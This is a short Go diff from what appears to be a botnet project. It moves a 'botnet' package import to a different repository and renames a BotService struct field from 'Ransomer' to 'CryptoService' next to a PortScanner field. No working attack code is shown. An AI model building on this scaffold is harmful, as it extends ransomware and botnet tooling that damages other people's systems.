@@ -9,15 +9,15 @@ import (
 	"os"
 	"strings"
 
-	"github.com/rodzzlessa24/botnet"
 	uuid "github.com/satori/go.uuid"
+	"github.com/threeaccents/botnet"
 )
 
 //BotService is
 type BotService struct {
-	Bot         *botnet.Bot
-	PortScanner botnet.PortScanner
-	Ransomer    botnet.Ransomer
+	Bot           *botnet.Bot
+	PortScanner   botnet.PortScanner
+	CryptoService botnet.CryptoService
 }
 
 //NewBot is
